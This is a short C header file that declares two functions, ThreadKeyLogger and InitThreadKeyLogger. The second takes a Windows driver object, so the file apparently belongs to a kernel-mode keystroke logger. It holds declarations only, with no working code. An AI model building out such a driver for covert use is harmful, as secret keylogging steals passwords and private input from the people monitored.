#ifndef __KbdLog_h__
#define __KbdLog_h__

VOID ThreadKeyLogger( IN PVOID pContext);
NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject);

#endif
